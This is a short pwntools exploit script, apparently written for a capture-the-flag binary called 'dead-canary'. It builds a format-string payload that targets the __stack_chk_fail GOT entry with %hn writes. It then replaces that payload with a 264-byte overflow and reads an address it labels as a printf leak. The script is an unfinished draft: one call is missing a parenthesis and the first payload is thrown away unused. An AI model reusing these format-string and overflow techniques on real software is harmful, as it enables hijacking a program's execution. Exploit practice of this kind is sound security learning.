from pwn import *

context = ['tmux','new-window']
p=process('./dead-canary')
#gdb.debug('./dead-canary')
#pause()

printf_got= 0x601038
printf_plt = 0x400630
__stack_chk_fail= 0x602010

payload = p64(__stack_chk_fail)#'.ljust(8)
payload += '|%7$hn|'.ljust(8) #7th
payload += '|%9$hn|'.ljust(8) #8th
payload += '%64x'#int('0x0040',16)
payload += '%1847x'#int('0x0737',16)

payload = ''
payload = 'A'*264

p.sendline(payload)

p.recvline()

received = p.recv(8)
leak = u64(received.ljust(8,'\x00')
log.info('Leak printf: ' + hex(leak))


